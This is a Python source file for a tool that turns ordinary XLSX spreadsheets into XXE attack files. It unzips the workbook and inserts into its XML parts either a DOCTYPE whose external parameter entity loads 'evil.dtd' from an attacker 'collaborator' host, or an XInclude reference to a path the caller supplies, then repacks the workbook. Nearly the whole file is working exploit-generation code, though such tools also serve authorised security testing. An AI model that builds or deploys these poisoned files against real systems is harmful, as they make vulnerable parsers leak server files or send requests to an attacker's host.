import os
import zipfile
import tempfile
import shutil
from datetime import datetime
import uuid
import logging
from werkzeug.utils import secure_filename

class XLSXProcessor:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
    
    def inject_xxe(self, input_path, payload_type, payload, collaborator=""):
        # Validate input path
        if not input_path or '..' in input_path or not input_path.endswith('.xlsx'):
            raise ValueError("Invalid input path")
        
        try:
            # Create unique output filename
            original_name = secure_filename(os.path.basename(input_path))
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_filename = f"xxe_{timestamp}_{original_name}"
            
            # Ensure output directory exists
            os.makedirs('processed', exist_ok=True)
            output_path = os.path.join('processed', output_filename)
            
            # Create a temporary working directory
            temp_work_dir = os.path.join(self.temp_dir, f"xxe_{uuid.uuid4().hex[:8]}")
            os.makedirs(temp_work_dir, exist_ok=True)
            
            # Extract the XLSX file (it's a ZIP archive) with path validation
            with zipfile.ZipFile(input_path, 'r') as zip_ref:
                for member in zip_ref.namelist():
                    if '..' in member or member.startswith('/'):
                        raise ValueError(f"Unsafe path in archive: {member}")
                zip_ref.extractall(temp_work_dir)
            
            # Find and modify XML files
            modified_files = self._process_xml_files(
                temp_work_dir, 
                payload_type, 
                payload, 
                collaborator
            )
            
            # Create new XLSX with injected payloads
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(temp_work_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_work_dir)
                        zipf.write(file_path, arcname)
            
            return {
                'success': True,
                'output_filename': output_filename,
                'modified_files': modified_files,
                'message': f'Successfully injected XXE payload into {len(modified_files)} files'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
        finally:
            # Ensure cleanup happens
            if os.path.exists(temp_work_dir):
                shutil.rmtree(temp_work_dir)
    
    def _process_xml_files(self, directory, payload_type, payload, collaborator):
        modified_files = []
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith('.xml') or file.endswith('.rels') or file in ['[Content_Types].xml']:
                    # Validate file path
                    if '..' in file or file.startswith('/'):
                        continue
                    file_path = os.path.join(root, file)
                    
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        # Check if it's an XML file that can be modified
                        modified_content = self._inject_into_xml(
                            content, 
                            payload_type, 
                            payload,
                            collaborator
                        )
                        
                        if modified_content != content:
                            with open(file_path, 'w', encoding='utf-8') as f:
                                f.write(modified_content)
                            modified_files.append(file)
                    
                    except Exception as e:
                        logging.error(f"Error processing {file}: {e}")
                        continue
        
        return modified_files
    
    def _inject_into_xml(self, xml_content, payload_type, payload, collaborator):
        """Inject XXE payload into XML content"""
        
        # Different injection strategies based on XML structure
        if '<?xml' in xml_content:
            lines = xml_content.split('\n')
            modified_lines = []
            
            for line in lines:
                if '<?xml' in line and payload_type == 'doctype':
                    # Insert DOCTYPE declaration after XML declaration
                    modified_lines.append(line)
                    doctype_payload = f'''<!DOCTYPE xxeattack [
<!ENTITY % xxe SYSTEM "{collaborator}/evil.dtd">
%xxe;
]>
'''
                    modified_lines.append(doctype_payload)
                elif payload_type == 'xinclude' and '<' in line and '>' in line:
                    # Inject XInclude
                    if 'xmlns:xi' not in xml_content:
                        line = line.replace('>', ' xmlns:xi="http://www.w3.org/2001/XInclude">', 1)
                    
                    # Add XInclude reference
                    xinclude_ref = f'''<xi:include href="{payload}" parse="text"/>'''
                    modified_lines.append(line)
                    modified_lines.append(xinclude_ref)
                    continue
                else:
                    modified_lines.append(line)
            
            return '\n'.join(modified_lines)
        
        return xml_content
    
    def analyze_xlsx_structure(self, input_path):
        """Analyze XLSX structure to find injection points"""
        # Validate input path
        if not input_path or '..' in input_path or not input_path.endswith('.xlsx'):
            raise ValueError("Invalid input path")
            
        structure = {
            'xml_files': [],
            'injection_points': [],
            'metadata': {}
        }
        
        temp_dir = os.path.join(self.temp_dir, f"analyze_{uuid.uuid4().hex[:8]}")
        os.makedirs(temp_dir, exist_ok=True)
        
        try:
            with zipfile.ZipFile(input_path, 'r') as zip_ref:
                file_list = zip_ref.namelist()
                structure['metadata']['total_files'] = len(file_list)
                
                for file in file_list:
                    # Validate file path
                    if '..' in file or file.startswith('/'):
                        continue
                        
                    if file.endswith('.xml') or file.endswith('.rels'):
                        structure['xml_files'].append(file)
                        
                        # Extract to analyze content
                        zip_ref.extract(file, temp_dir)
                        file_path = os.path.join(temp_dir, file)
                        
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                            
                            # Check for potential injection points
                            if '<?xml' in content:
                                structure['injection_points'].append({
                                    'file': file,
                                    'has_xml_declaration': True,
                                    'size': len(content)
                                })
            
        except Exception as e:
            logging.error(f"Analysis error: {e}")
        finally:
            # Ensure cleanup happens
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
        
        return structure